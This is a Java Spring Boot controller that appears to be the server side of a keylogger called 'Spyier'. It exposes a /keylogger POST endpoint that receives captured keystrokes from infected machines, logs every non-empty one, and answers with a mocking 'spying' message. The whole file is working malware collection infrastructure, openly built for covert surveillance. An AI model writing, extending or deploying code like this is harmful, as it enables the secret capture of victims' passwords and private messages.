package keylogger.backend.controllers;

import io.swagger.v3.oas.annotations.Operation;
import keylogger.backend.dtos.payloads.KeyloggerPayloadDto;
import keylogger.backend.dtos.responses.KeyloggerResponseDto;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@Slf4j
@RestController
@RequestMapping("/keylogger")
public class KeyloggerController {
    @Operation(summary = "Handles keyboard logs sent by Spyier.")
    @PostMapping
    public ResponseEntity<KeyloggerResponseDto> handleKeylogger(@RequestBody KeyloggerPayloadDto keyboardDto) {
        if (!keyboardDto.keypress().isEmpty()) {
            log.info(keyboardDto.keypress());
        }
        return ResponseEntity.ok(new KeyloggerResponseDto("spying \uD83D\uDE08"));
    }
}
